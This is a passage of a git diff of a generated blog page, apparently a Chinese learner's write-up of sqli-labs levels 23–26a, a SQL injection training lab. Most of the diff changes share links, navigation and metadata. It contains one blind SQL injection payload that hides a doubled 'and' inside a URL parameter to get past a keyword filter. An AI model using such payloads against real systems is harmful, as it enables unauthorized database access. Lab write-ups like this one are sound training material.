+<p>附上学习链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13940107.html#less-26a">sqli-labs 通关指南：Less 26 - 乌漆 WhiteMoon - 博客园 (cnblogs.com)</a></p>
+<p>我尝试 union 注入失败了，还是老老实实的盲注吧</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230113_151926.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230113_151926.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>本关的题目就写了基于盲注，还是使用盲注吧</p>
 <p>获取当前数据库名称</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)aandnd(left((select(database())),8)=&#x27;security&#x27;)aandnd(&#x27;1</span><br></pre></td></tr></table></figure>
-
-<p>其他的payload就不一一列出了</p>
+<p>其他的 payload 就不一一列出了</p>
 
   </div>
   
@@ -2900,7 +2887,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/&title=sqli-labs-23-26a - Dr4x3zz&summary=sqli-labs-23-26a"
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/&title=sqli-labs-23-26a - Dr4x3zz&summary=# sqli-labs-23-26a"
           
           >
           
@@ -2912,7 +2899,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/&title=sqli-labs-23-26a - Dr4x3zz&summary=sqli-labs-23-26a"
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/&title=sqli-labs-23-26a - Dr4x3zz&summary=# sqli-labs-23-26a"
           
           >
           
@@ -2924,7 +2911,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/&title=sqli-labs-23-26a - Dr4x3zz&summary=sqli-labs-23-26a"
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/&title=sqli-labs-23-26a - Dr4x3zz&summary=# sqli-labs-23-26a"
           
           >
           
@@ -2959,19 +2946,19 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='prev' href='/2023/01/10/%E5%85%B3%E4%BA%8Eand-1-1%E5%92%8Cand-1-2%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/'>
           <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>关于and 1=1和and 1=2学习记录</p>
-          <p class='content'>关于and 1&#x3D;1和and 1&#x3D;2学习记录
+          <p class='content'># 关于 and 1=1 和 and 1=2 学习记录
 
-在23关时，我又重新对于这个and 1&#x3D;1和and 1&#x3D;2以及在注入时用一个错误的id后面的union  s...</p>
+在 23 关时，我又重新对于这个 and 1=1 和 and 1=2 以及在注入时用一个错误的 id 后面的 union  select...</p>
         </a>
       
       
         <a class='next' href='/2023/01/09/sqli-labs-21-22/'>
           <p class='title'>sqli-labs-21-22<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>sqli-labs-21-22
+          <p class='content'># sqli-labs-21-22
 
-sqli-labs-21用bp抓包，输入正确的账号密码后
-通过HTTP history能看到抓到了两个报文一个是get型一个是post型，get型
-post型用...</p>
+# sqli-labs-21
+用 bp 抓包，输入正确的账号密码后
+通过 HTTP history 能看到抓到了两个报文一个是 get 型一个是 post ...</p>
         </a>
       
     </div>
@@ -3029,7 +3016,7 @@ post型用...</p>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-23"><span class="toc-text">sqli-labs-23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-24"><span class="toc-text">sqli-labs-24</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-25"><span class="toc-text">sqli-labs-25</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-25a"><span class="toc-text">sqli-labs-25a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-26"><span class="toc-text">sqli-labs-26</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-26a"><span class="toc-text">sqli-labs-26a</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-23"><span class="toc-text"> sqli-labs-23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-24"><span class="toc-text"> sqli-labs-24</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-25"><span class="toc-text"> sqli-labs-25</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-25a"><span class="toc-text"> sqli-labs-25a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-26"><span class="toc-text"> sqli-labs-26</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-26a"><span class="toc-text"> sqli-labs-26a</span></a></li></ol>
     </div>
   </section>
 
@@ -3599,7 +3586,7 @@ post型用...</p>
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/sqli-labs/","name":"sqli-labs"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/","name":"sqli-labs-23-26a"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqli-labs-23-26a","description":"sqli-labs-23-26a","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/","wordCount":16,"datePublished":"2023-01-10T06:19:13.000Z","dateModified":"2023-01-16T10:34:28.000Z","articleSection":"sqli-labs","keywords":"sqli-labs","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/sqli-labs/","name":"sqli-labs"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/","name":"sqli-labs-23-26a"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqli-labs-23-26a","description":"# sqli-labs-23-26a","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/","wordCount":18,"datePublished":"2023-01-10T06:19:13.000Z","dateModified":"2023-01-16T10:34:28.000Z","articleSection":"sqli-labs","keywords":"sqli-labs","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
